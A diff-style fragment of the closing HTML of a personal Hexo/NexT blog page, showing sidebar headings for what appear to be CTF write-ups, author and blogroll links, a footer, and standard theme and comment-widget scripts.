href="#%E9%9E%8D%E5%B1%B1%E5%A4%A7%E6%B3%95%E5%AE%98%E5%BC%80%E5%BA%AD%E4%B9%8B%E7%BC%BA%E7%9A%84%E8%90%A5%E5%85%BB%E8%BF%99%E4%B8%80%E5%9D%97%E6%80%8E%E4%B9%88%E8%A1%A5"><span class="nav-number">3.1.</span> <span class="nav-text">鞍山大法官开庭之缺的营养这一块怎么补</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84RSA"><span class="nav-number">3.2.</span> <span class="nav-text">简单的RSA</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easy-rsa"><span class="nav-number">3.3.</span> <span class="nav-text">easy-rsa</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#wing"><span class="nav-number">3.4.</span> <span class="nav-text">wing</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#signin"><span class="nav-number">3.5.</span> <span class="nav-text">signin</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#re"><span class="nav-number">4.</span> <span class="nav-text">re</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="安小琪"
+      src="/images/header.jpg">
+  <p class="site-author-name" itemprop="name">安小琪</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">101</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">22</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/npfs06" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;npfs06" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:npfs066@gmail.com" title="E-Mail → mailto:npfs066@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://hyluz.cn/" title="https:&#x2F;&#x2F;hyluz.cn&#x2F;" rel="noopener" target="_blank">Luz</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://0clickjacking0.github.io/" title="https:&#x2F;&#x2F;0clickjacking0.github.io&#x2F;" rel="noopener" target="_blank">xianyu123</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://jiang-niao.github.io/" title="https:&#x2F;&#x2F;jiang-niao.github.io&#x2F;" rel="noopener" target="_blank">JiangNiao</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://xiaolong22333.top/" title="https:&#x2F;&#x2F;xiaolong22333.top&#x2F;" rel="noopener" target="_blank">xiaolong</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+
+
+<!--
+ <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+-->
+
+
+  <span class="author" itemprop="copyrightHolder">安小琪</span>
+  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">浙ICP备2020030100号 </a>
+  </div>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+<script>
+document.querySelectorAll('.pdfobject-container').forEach(element => {
+  let url = element.dataset.target;
+  let pdfOpenParams = {
+    navpanes : 0,
+    toolbar  : 0,
+    statusbar: 0,
+    pagemode : 'thumbs',
+    view     : 'FitH'
+  };
+  let pdfOpenFragment = '#' + Object.entries(pdfOpenParams).map(([key, value]) => `${key}=${encodeURIComponent(value)}`).join('&');
+  let fullURL = `/lib/pdf/web/viewer.html?file=${encodeURIComponent(url)}${pdfOpenFragment}`;
+
+  if (NexT.utils.supportsPDFs()) {
+    element.innerHTML = `<embed class="pdfobject" src="${url + pdfOpenFragment}" type="application/pdf" style="height: ${element.dataset.height};">`;
+  } else {
+    element.innerHTML = `<iframe src="${fullURL}" style="height: ${element.dataset.height};" frameborder="0"></iframe>`;
+  }
+});
+</script>
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'nhITwFwMLqOi81E1nOPXx9Iw-MdYXbMMI',
+      appKey     : 'F9l5INUqgwxvbJOfC1X7OMnr',
+      placeholder: "欢迎在这里留言！我看到一定会及时回复的噢 （PS：回复信息会自动发送到你所填写的邮箱噢）",
+      avatar     : '',
+      meta       : guest,
+      pageSize   : '6' || 10,
+      visitor    : false,
+      lang       : 'zh-cn' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
